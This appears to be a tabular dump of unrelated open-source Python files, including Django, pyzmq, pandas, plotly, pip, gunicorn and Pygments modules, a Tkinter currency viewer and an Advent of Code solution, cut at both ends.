    '%m/%d/%y %H.%M',                   # '10/25/06 14.30'
    '%m/%d/%Y %H.%M.%S',                # '25/10/2009 14.30.59'
    '%m/%d/%Y %H.%M.%S.%f',             # '25/10/2009 14.30.59.000200'
    '%m/%d/%Y %H.%M',                   # '25/10/2009 14.30'
]

DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JY30	JY30-monitoredqueuedevice.py	"""""""MonitoredQueue classes and functions.""""""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.


from zmq import PUB
from zmq.devices.monitoredqueue import monitored_queue
from zmq.devices.proxydevice import ProcessProxy, Proxy, ProxyBase, ThreadProxy


class MonitoredQueueBase(ProxyBase):
    """"""Base class for overriding methods.""""""

    _in_prefix = b''
    _out_prefix = b''

    def __init__(
        self, in_type, out_type, mon_type=PUB, in_prefix=b'in', out_prefix=b'out'
    ):

        ProxyBase.__init__(self, in_type=in_type, out_type=out_type, mon_type=mon_type)

        self._in_prefix = in_prefix
        self._out_prefix = out_prefix

    def run_device(self):
        ins, outs, mons = self._setup_sockets()
        monitored_queue(ins, outs, mons, self._in_prefix, self._out_prefix)


class MonitoredQueue(MonitoredQueueBase, Proxy):
    """"""Class for running monitored_queue in the background.

    See zmq.devices.Device for most of the spec. MonitoredQueue differs from Proxy,
    only in that it adds a ``prefix`` to messages sent on the monitor socket,
    with a different prefix for each direction.

    MQ also supports ROUTER on both sides, which zmq.proxy does not.

    If a message arrives on `in_sock`, it will be prefixed with `in_prefix` on the monitor socket.
    If it arrives on out_sock, it will be prefixed with `out_prefix`.

    A PUB socket is the most logical choice for the mon_socket, but it is not required.
    """"""


class ThreadMonitoredQueue(MonitoredQueueBase, ThreadProxy):
    """"""Run zmq.monitored_queue in a background thread.

    See MonitoredQueue and Proxy for details.
    """"""


class ProcessMonitoredQueue(MonitoredQueueBase, ProcessProxy):
    """"""Run zmq.monitored_queue in a separate process.

    See MonitoredQueue and Proxy for details.
    """"""


__all__ = ['MonitoredQueue', 'ThreadMonitoredQueue', 'ProcessMonitoredQueue']"
JD391	JD391-const.py	"""""""
PostGIS to GDAL conversion constant definitions
""""""
# Lookup to convert pixel type values from GDAL to PostGIS
GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]

# Lookup to convert pixel type values from PostGIS to GDAL
POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]

# Struct pack structure for raster header, the raster header has the
# following structure:
#
# Endianness, PostGIS raster version, number of bands, scale, origin,
# skew, srid, width, and height.
#
# Scale, origin, and skew have x and y values. PostGIS currently uses
# a fixed endianness (1) and there is only one version (0).
POSTGIS_HEADER_STRUCTURE = ""B H H d d d d d d i H H""

# Lookup values to convert GDAL pixel types to struct characters. This is
# used to pack and unpack the pixel values of PostGIS raster bands.
GDAL_TO_STRUCT = [
    None,
    ""B"",
    ""H"",
    ""h"",
    ""L"",
    ""l"",
    ""f"",
    ""d"",
    None,
    None,
    None,
    None,
]

# Size of the packed value in bytes for different numerical types.
# This is needed to cut chunks of band data out of PostGIS raster strings
# when decomposing them into GDALRasters.
# See https://docs.python.org/library/struct.html#format-characters
STRUCT_SIZE = {
    ""b"": 1,  # Signed char
    ""B"": 1,  # Unsigned char
    ""?"": 1,  # _Bool
    ""h"": 2,  # Short
    ""H"": 2,  # Unsigned short
    ""i"": 4,  # Integer
    ""I"": 4,  # Unsigned Integer
    ""l"": 4,  # Long
    ""L"": 4,  # Unsigned Long
    ""f"": 4,  # Float
    ""d"": 8,  # Double
}

# Pixel type specifies type of pixel values in a band. Storage flag specifies
# whether the band data is stored as part of the datum or is to be found on the
# server's filesystem. There are currently 11 supported pixel value types, so 4
# bits are enough to account for all. Reserve the upper 4 bits for generic
# flags. See
# https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag
BANDTYPE_PIXTYPE_MASK = 0x0F
BANDTYPE_FLAG_HASNODATA = 1 << 6"
JD365	JD365-main_test.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the 'License');
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an 'AS IS' BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import datetime
import os
import uuid

from google.cloud import bigtable
import pytest
from requests import Request

import main

PROJECT = os.environ['GOOGLE_CLOUD_PROJECT']
BIGTABLE_INSTANCE = os.environ['BIGTABLE_INSTANCE']
TABLE_ID_PREFIX = 'mobile-time-series-{}'


@pytest.fixture(scope=""module"", autouse=True)
def table_id():
    client = bigtable.Client(project=PROJECT, admin=True)
    instance = client.instance(BIGTABLE_INSTANCE)

    table_id = TABLE_ID_PREFIX.format(str(uuid.uuid4())[:16])
    table = instance.table(table_id)
    if table.exists():
        table.delete()

    table.create(column_families={'stats_summary': None})

    timestamp = datetime.datetime(2019, 5, 1)
    rows = [
        table.direct_row(""phone#4c410523#20190501""),
        table.direct_row(""phone#4c410523#20190502"")
    ]

    rows[0].set_cell(""stats_summary"", ""os_build"", ""PQ2A.190405.003"", timestamp)
    rows[1].set_cell(""stats_summary"", ""os_build"", ""PQ2A.190405.004"", timestamp)

    table.mutate_rows(rows)

    yield table_id

    table.delete()


def test_main(table_id):
    request = Request('GET', headers={
      'instance_id': BIGTABLE_INSTANCE,
      'table_id': table_id
    })

    response = main.bigtable_read_data(request)

    assert """"""Rowkey: phone#4c410523#20190501, os_build: PQ2A.190405.003
Rowkey: phone#4c410523#20190502, os_build: PQ2A.190405.004"""""" in response"
JD305	JD305-jsonl.py	"""""""
Serialize data to/from JSON Lines
""""""

import json

from django.core.serializers.base import DeserializationError
from django.core.serializers.json import DjangoJSONEncoder
from django.core.serializers.python import Deserializer as PythonDeserializer
from django.core.serializers.python import Serializer as PythonSerializer


class Serializer(PythonSerializer):
    """"""Convert a queryset to JSON Lines.""""""

    internal_use_only = False

    def _init_options(self):
        self._current = None
        self.json_kwargs = self.options.copy()
        self.json_kwargs.pop(""stream"", None)
        self.json_kwargs.pop(""fields"", None)
        self.json_kwargs.pop(""indent"", None)
        self.json_kwargs[""separators""] = ("","", "": "")
        self.json_kwargs.setdefault(""cls"", DjangoJSONEncoder)
        self.json_kwargs.setdefault(""ensure_ascii"", False)

    def start_serialization(self):
        self._init_options()

    def end_object(self, obj):
        # self._current has the field data
        json.dump(self.get_dump_object(obj), self.stream, **self.json_kwargs)
        self.stream.write(""\n"")
        self._current = None

    def getvalue(self):
        # Grandparent super
        return super(PythonSerializer, self).getvalue()


def Deserializer(stream_or_string, **options):
    """"""Deserialize a stream or string of JSON data.""""""
    if isinstance(stream_or_string, bytes):
        stream_or_string = stream_or_string.decode()
    if isinstance(stream_or_string, (bytes, str)):
        stream_or_string = stream_or_string.split(""\n"")

    for line in stream_or_string:
        if not line.strip():
            continue
        try:
            yield from PythonDeserializer([json.loads(line)], **options)
        except (GeneratorExit, DeserializationError):
            raise
        except Exception as exc:
            raise DeserializationError() from exc"
JY144	JY144-install_scripts.py	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):

    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=', 'b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options(
            'install',
            ('install_scripts', 'install_dir'),
            ('force', 'force'),
            ('skip_build', 'skip_build'),
        )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
JY460	JY460-test_freq_attr.py	"import pytest

from pandas import TimedeltaIndex

from pandas.tseries.offsets import (
    DateOffset,
    Day,
    Hour,
)


class TestFreq:
    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])
    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])
    def test_freq_setter(self, values, freq):
        # GH#20678
        idx = TimedeltaIndex(values)

        # can set to an offset, converting from string if necessary
        idx._data.freq = freq
        assert idx.freq == freq
        assert isinstance(idx.freq, DateOffset)

        # can reset to None
        idx._data.freq = None
        assert idx.freq is None

    def test_freq_setter_errors(self):
        # GH#20678
        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])

        # setting with an incompatible freq
        msg = (
            ""Inferred frequency 2D from passed values does not conform to ""
            ""passed frequency 5D""
        )
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""5D""

        # setting with a non-fixed frequency
        msg = r""<2 \* BusinessDays> is a non-fixed frequency""
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""2B""

        # setting with non-freq string
        with pytest.raises(ValueError, match=""Invalid frequency""):
            idx._data.freq = ""foo""

    def test_freq_view_safe(self):
        # Setting the freq for one TimedeltaIndex shouldn't alter the freq
        #  for another that views the same data

        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")
        tda = tdi._data

        tdi2 = TimedeltaIndex(tda)._with_freq(None)
        assert tdi2.freq is None

        # Original was not altered
        assert tdi.freq == ""2D""
        assert tda.freq == ""2D"""
JY406	JY406-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""cone.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD520	JD520-api.py	"from pandas.core.dtypes.common import (
    is_array_like,
    is_bool,
    is_bool_dtype,
    is_categorical,
    is_categorical_dtype,
    is_complex,
    is_complex_dtype,
    is_datetime64_any_dtype,
    is_datetime64_dtype,
    is_datetime64_ns_dtype,
    is_datetime64tz_dtype,
    is_dict_like,
    is_dtype_equal,
    is_extension_array_dtype,
    is_extension_type,
    is_file_like,
    is_float,
    is_float_dtype,
    is_hashable,
    is_int64_dtype,
    is_integer,
    is_integer_dtype,
    is_interval,
    is_interval_dtype,
    is_iterator,
    is_list_like,
    is_named_tuple,
    is_number,
    is_numeric_dtype,
    is_object_dtype,
    is_period_dtype,
    is_re,
    is_re_compilable,
    is_scalar,
    is_signed_integer_dtype,
    is_sparse,
    is_string_dtype,
    is_timedelta64_dtype,
    is_timedelta64_ns_dtype,
    is_unsigned_integer_dtype,
    pandas_dtype,
)

__all__ = [
    ""is_array_like"",
    ""is_bool"",
    ""is_bool_dtype"",
    ""is_categorical"",
    ""is_categorical_dtype"",
    ""is_complex"",
    ""is_complex_dtype"",
    ""is_datetime64_any_dtype"",
    ""is_datetime64_dtype"",
    ""is_datetime64_ns_dtype"",
    ""is_datetime64tz_dtype"",
    ""is_dict_like"",
    ""is_dtype_equal"",
    ""is_extension_array_dtype"",
    ""is_extension_type"",
    ""is_file_like"",
    ""is_float"",
    ""is_float_dtype"",
    ""is_hashable"",
    ""is_int64_dtype"",
    ""is_integer"",
    ""is_integer_dtype"",
    ""is_interval"",
    ""is_interval_dtype"",
    ""is_iterator"",
    ""is_list_like"",
    ""is_named_tuple"",
    ""is_number"",
    ""is_numeric_dtype"",
    ""is_object_dtype"",
    ""is_period_dtype"",
    ""is_re"",
    ""is_re_compilable"",
    ""is_scalar"",
    ""is_signed_integer_dtype"",
    ""is_sparse"",
    ""is_string_dtype"",
    ""is_timedelta64_dtype"",
    ""is_timedelta64_ns_dtype"",
    ""is_unsigned_integer_dtype"",
    ""pandas_dtype"",
]"
JD73	JD73-selection_prefs.py	"from typing import Optional

from pip._internal.models.format_control import FormatControl


class SelectionPreferences:
    """"""
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """"""

    __slots__ = [
        ""allow_yanked"",
        ""allow_all_prereleases"",
        ""format_control"",
        ""prefer_binary"",
        ""ignore_requires_python"",
    ]

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked: bool,
        allow_all_prereleases: bool = False,
        format_control: Optional[FormatControl] = None,
        prefer_binary: bool = False,
        ignore_requires_python: Optional[bool] = None,
    ) -> None:
        """"""Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            ""Requires-Python"" values in links. Defaults to False.
        """"""
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python"
JY437	JY437-__init__.py	"""""""Map-only template""""""

import re

import gws
import gws.base.template
import gws.lib.html2
import gws.lib.mime
import gws.gis.render

gws.ext.new.template('map')


class Config(gws.base.template.Config):
    pass


class Props(gws.base.template.Props):
    pass


class Object(gws.base.template.Object):

    def render(self, tri, notify=None):
        mp = tri.maps[0]

        mri = gws.MapRenderInput(
            background_color=mp.background_color,
            bbox=mp.bbox,
            center=mp.center,
            crs=tri.crs,
            dpi=tri.dpi,
            out_size=self.page_size,
            planes=mp.planes,
            rotation=mp.rotation,
            scale=mp.scale,
        )

        notify = notify or (lambda a, b=None: None)

        notify('begin_print')
        notify('begin_page')
        notify('begin_map')

        mro = gws.gis.render.render_map(mri, notify)
        html = gws.gis.render.output_to_html_string(mro, wrap='fixed')

        notify('end_map')
        notify('end_page')
        notify('finalize_print')

        if not tri.mimeOut or tri.mimeOut == gws.lib.mime.HTML:
            notify('end_print')
            return gws.ContentResponse(mime=gws.lib.mime.HTML, content=html)

        if tri.mimeOut == gws.lib.mime.PDF:
            res_path = gws.tempname('map.pdf')
            gws.lib.html2.render_to_pdf(
                html,
                out_path=res_path,
                page_size=self.page_size,
            )
            notify('end_print')
            return gws.ContentResponse(path=res_path)

        if tri.mimeOut == gws.lib.mime.PNG:
            res_path = gws.tempname('map.png')
            gws.lib.html2.render_to_png(
                html,
                out_path=res_path,
                page_size=self.page_size,
            )
            notify('end_print')
            return gws.ContentResponse(path=res_path)

        raise gws.Error(f'invalid output mime: {tri.mimeOut!r}')"
JD436	JD436-guestbook_test.py	"# Copyright 2016 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pytest
import webtest

import guestbook


@pytest.fixture
def app(testbed):
    return webtest.TestApp(guestbook.app)


def test_get_guestbook_sync(app, testbed, login):
    guestbook.Account(id='123').put()
    # Log the user in
    login(id='123')

    for i in range(11):
        guestbook.Guestbook(content='Content {}'.format(i)).put()

    response = app.get('/guestbook')

    assert response.status_int == 200
    assert 'Content 1' in response.body


def test_get_guestbook_async(app, testbed, login):
    guestbook.Account(id='123').put()
    # Log the user in
    login(id='123')
    for i in range(11):
        guestbook.Guestbook(content='Content {}'.format(i)).put()

    response = app.get('/guestbook?async=1')

    assert response.status_int == 200
    assert 'Content 1' in response.body


def test_get_messages_sync(app, testbed):
    for i in range(21):
        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()
        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()

    response = app.get('/messages')

    assert response.status_int == 200
    assert 'Nick 1 wrote:' in response.body
    assert '<p>Text 1' in response.body


def test_get_messages_async(app, testbed):
    for i in range(21):
        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()
        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()

    response = app.get('/messages?async=1')

    assert response.status_int == 200
    assert 'Nick 1 wrote:' in response.body
    assert '\nText 1' in response.body"
JY482	JY482-pasterapp.py	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import configparser
import os

from paste.deploy import loadapp

from gunicorn.app.wsgiapp import WSGIApplication
from gunicorn.config import get_default_config_file


def get_wsgi_app(config_uri, name=None, defaults=None):
    if ':' not in config_uri:
        config_uri = ""config:%s"" % config_uri

    return loadapp(
        config_uri,
        name=name,
        relative_to=os.getcwd(),
        global_conf=defaults,
    )


def has_logging_config(config_file):
    parser = configparser.ConfigParser()
    parser.read([config_file])
    return parser.has_section('loggers')


def serve(app, global_conf, **local_conf):
    """"""\
    A Paste Deployment server runner.

    Example configuration:

        [server:main]
        use = egg:gunicorn#main
        host = 127.0.0.1
        port = 5000
    """"""
    config_file = global_conf['__file__']
    gunicorn_config_file = local_conf.pop('config', None)

    host = local_conf.pop('host', '')
    port = local_conf.pop('port', '')
    if host and port:
        local_conf['bind'] = '%s:%s' % (host, port)
    elif host:
        local_conf['bind'] = host.split(',')

    class PasterServerApplication(WSGIApplication):
        def load_config(self):
            self.cfg.set(""default_proc_name"", config_file)

            if has_logging_config(config_file):
                self.cfg.set(""logconfig"", config_file)

            if gunicorn_config_file:
                self.load_config_from_file(gunicorn_config_file)
            else:
                default_gunicorn_config_file = get_default_config_file()
                if default_gunicorn_config_file is not None:
                    self.load_config_from_file(default_gunicorn_config_file)

            for k, v in local_conf.items():
                if v is not None:
                    self.cfg.set(k.lower(), v)

        def load(self):
            return app

    PasterServerApplication().run()"
JY84	JY84-middleware.py	"from django.apps import apps
from django.conf import settings
from django.contrib.redirects.models import Redirect
from django.contrib.sites.shortcuts import get_current_site
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpResponseGone, HttpResponsePermanentRedirect
from django.utils.deprecation import MiddlewareMixin


class RedirectFallbackMiddleware(MiddlewareMixin):
    # Defined as class-level attributes to be subclassing-friendly.
    response_gone_class = HttpResponseGone
    response_redirect_class = HttpResponsePermanentRedirect

    def __init__(self, get_response=None):
        if not apps.is_installed('django.contrib.sites'):
            raise ImproperlyConfigured(
                ""You cannot use RedirectFallbackMiddleware when ""
                ""django.contrib.sites is not installed.""
            )
        super().__init__(get_response)

    def process_response(self, request, response):
        # No need to check for a redirect for non-404 responses.
        if response.status_code != 404:
            return response

        full_path = request.get_full_path()
        current_site = get_current_site(request)

        r = None
        try:
            r = Redirect.objects.get(site=current_site, old_path=full_path)
        except Redirect.DoesNotExist:
            pass
        if r is None and settings.APPEND_SLASH and not request.path.endswith('/'):
            try:
                r = Redirect.objects.get(
                    site=current_site,
                    old_path=request.get_full_path(force_append_slash=True),
                )
            except Redirect.DoesNotExist:
                pass
        if r is not None:
            if r.new_path == '':
                return self.response_gone_class()
            return self.response_redirect_class(r.new_path)

        # No redirect was found. Return the response.
        return response"
JY334	JY334-historicalscheduler.py	"from datetime import datetime
from .virtualtimescheduler import VirtualTimeScheduler


class HistoricalScheduler(VirtualTimeScheduler):
    """"""Provides a virtual time scheduler that uses datetime for absolute time
    and timedelta for relative time.""""""

    def __init__(self, initial_clock=None, comparer=None):
        """"""Creates a new historical scheduler with the specified initial clock
        value.

        Keyword arguments:
        initial_clock -- {Number} Initial value for the clock.
        comparer -- {Function} Comparer to determine causality of events based
            on absolute time.""""""

        def compare_datetimes(a, b):
            return (a > b) - (a < b)

        clock = initial_clock or datetime.fromtimestamp(0)
        comparer = comparer or compare_datetimes

        super(HistoricalScheduler, self).__init__(clock)

    @property
    def now(self):
        """"""Represents a notion of time for this scheduler. Tasks being scheduled
        on a scheduler will adhere to the time denoted by this property.""""""

        return self.clock

    @staticmethod
    def add(absolute, relative):
        """"""Adds a relative time value to an absolute time value.

        Keyword arguments:
        absolute -- {datetime} Absolute virtual time value.
        relative -- {timedelta} Relative virtual time value to add.

        Returns resulting absolute virtual time sum value.""""""

        return absolute + relative

    def to_datetime_offset(self, absolute):
        """"""Converts the absolute time value to a datetime value.""""""

        # datetime -> datetime
        return absolute

    def to_relative(self, timespan):
        """"""Converts the timespan value to a relative virtual time value.

        Keyword arguments:
        timespan -- {timedelta} Time_span value to convert.

        Returns corresponding relative virtual time value.""""""

        # timedelta -> timedelta
        return timespan"
JY262	JY262-_line.py	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
JY177	JY177-trio_runner.py	"import builtins
import logging
import signal
import threading
import traceback
import warnings

import trio


class TrioRunner:
    def __init__(self):
        self._cell_cancel_scope = None
        self._trio_token = None

    def initialize(self, kernel, io_loop):
        kernel.shell.set_trio_runner(self)
        kernel.shell.run_line_magic(""autoawait"", ""trio"")
        kernel.shell.magics_manager.magics[""line""][""autoawait""] = lambda _: warnings.warn(
            ""Autoawait isn't allowed in Trio background loop mode.""
        )
        bg_thread = threading.Thread(target=io_loop.start, daemon=True, name=""TornadoBackground"")
        bg_thread.start()

    def interrupt(self, signum, frame):
        if self._cell_cancel_scope:
            self._cell_cancel_scope.cancel()
        else:
            raise Exception(""Kernel interrupted but no cell is running"")

    def run(self):
        old_sig = signal.signal(signal.SIGINT, self.interrupt)

        def log_nursery_exc(exc):
            exc = ""\n"".join(traceback.format_exception(type(exc), exc, exc.__traceback__))
            logging.error(""An exception occurred in a global nursery task.\n%s"", exc)

        async def trio_main():
            self._trio_token = trio.lowlevel.current_trio_token()
            async with trio.open_nursery() as nursery:
                # TODO This hack prevents the nursery from cancelling all child
                # tasks when an uncaught exception occurs, but it's ugly.
                nursery._add_exc = log_nursery_exc
                builtins.GLOBAL_NURSERY = nursery  # type:ignore[attr-defined]
                await trio.sleep_forever()

        trio.run(trio_main)
        signal.signal(signal.SIGINT, old_sig)

    def __call__(self, async_fn):
        async def loc(coro):
            self._cell_cancel_scope = trio.CancelScope()
            with self._cell_cancel_scope:
                return await coro
            self._cell_cancel_scope = None

        return trio.from_thread.run(loc, async_fn, trio_token=self._trio_token)"
JY24	JY24-x10.py	"""""""
    pygments.lexers.x10
    ~~~~~~~~~~~~~~~~~~~

    Lexers for the X10 programming language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Keyword, String

__all__ = ['X10Lexer']

class X10Lexer(RegexLexer):
    """"""
    For the X10 language.

    .. versionadded:: 0.1
    """"""

    name = 'X10'
    url = 'http://x10-lang.org/'
    aliases = ['x10', 'xten']
    filenames = ['*.x10']
    mimetypes = ['text/x-x10']

    keywords = (
        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',
        'break', 'case', 'catch', 'class', 'clocked', 'continue',
        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',
        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',
        'instanceof', 'interface', 'isref', 'new', 'offer',
        'operator', 'package', 'return', 'struct', 'switch', 'throw',
        'try', 'type', 'val', 'var', 'when', 'while'
    )

    types = (
        'void'
    )

    values = (
        'false', 'null', 'self', 'super', 'this', 'true'
    )

    modifiers = (
        'abstract', 'extends', 'implements', 'native', 'offers',
        'private', 'property', 'protected', 'public', 'static',
        'throws', 'transient'
    )

    tokens = {
        'root': [
            (r'[^\S\n]+', Text),
            (r'//.*?\n', Comment.Single),
            (r'/\*(.|\n)*?\*/', Comment.Multiline),
            (r'\b(%s)\b' % '|'.join(keywords), Keyword),
            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),
            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),
            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),
            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),
            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),
            (r'.', Text)
        ],
    }"
JY257	JY257-Currencies.py	"import requests
import xmltodict
from tkinter import *
import tkinter as tk

# Создаем окно верхнего уровня
window = Tk()
window.geometry(""400x100"")
window.title('Currencies cbr.ru')

# Добавление кнопки закрытия окна
btnClosePopup = tk.Button(window, text=""Закрыть"", bg='#990000', fg='white', font=('Helvetica', 10, 'bold'), command=window.destroy)
btnClosePopup.place(x=280, y=50, width=110, height=30)

# Парсинг данных с cbr.ru
url = ""http://www.cbr.ru/scripts/XML_val.asp""
response = requests.get(url)
data = xmltodict.parse(response.content)


# Обработчик нажатия кнопки
def process_button():
    my_array = []
    for item in data['Valuta']['Item']:
        my_set = [item['Name'], item['EngName'], item['Nominal'], item['ParentCode']]
        my_array.append(my_set)
        print(my_set)
    popup_window(my_array)


def popup_window(my_array):
    window = tk.Toplevel()
    window.geometry(""500x500"")
    window.title(""Результат"")

    # Добавление окна вывода текста
    txtOutput = tk.Text(window, font=('Courier New', 10, 'bold'))
    txtOutput.place(x=15, y=115, width=470, height=300)

    # Сформировать строку с данными
    output_str = """"
    for item in my_array:
        output_str += f""Name: {item[0]}\n""
        output_str += f""EngName: {item[1]}\n""
        output_str += f""Nominal: {item[2]}\n""
        output_str += f""ParentCode: {item[3]}\n\n""

    # Вывод строки в окне
    txtOutput.insert(END, output_str)


# Создание кнопки
button = tk.Button(window, text=""Парсинг данных"", font=('Helvetica', 10, 'bold'), command=process_button)
button.place(x=10, y=50, width=110, height=30)

window.mainloop()


"
JY520	JY520-15.py	"""""""
https://adventofcode.com/2016/day/15
""""""
from utils import extract_ints, read_data

USE_TEST_DATA = False
SPLIT_BY_LINE = True
data = read_data(USE_TEST_DATA, SPLIT_BY_LINE)


def parse_data(data_in):
    """""" Read the input data to retrieve the disc positions """"""
    num_positions = []
    starting_pos = []

    for line in data_in:
        ints = extract_ints(line)
        num_positions.append(ints[1])
        starting_pos.append(ints[3])

    return num_positions, starting_pos


def is_at_zero(num_positions, starting_pos, disc_index, time):
    """""" Is the specified disc at the zero position at the given time? """"""
    pos = (starting_pos[disc_index] + time) % num_positions[disc_index]
    return pos == 0


def find_time(num_positions, starting_pos):
    """"""
    Find the time at which to release a capsule so that it passes through all
    discs successfully
    """"""

    # What's the first time that we can release the disc where it reaches the
    # first disc as it's at position 0?
    candidate_time = num_positions[0] - starting_pos[0] - 1

    while True:
        # Are all discs at position 0 when the capsule reaches them?
        collision = False
        for disc_index in range(len(num_positions)):
            time_capsule_reaches_disc = candidate_time + disc_index + 1
            if not is_at_zero(num_positions, starting_pos, disc_index, time_capsule_reaches_disc):
                collision = True
                break

        # There was no collision with any disc! candidate_time is the correct answer!
        if not collision:
            return candidate_time

        # There was a collision so candidate_time isn't a valid result.
        # Increment it to the next time that disc 1 (index 0) is at the zero position.
        candidate_time += num_positions[0]


positions, starting = parse_data(data)

# Part 1
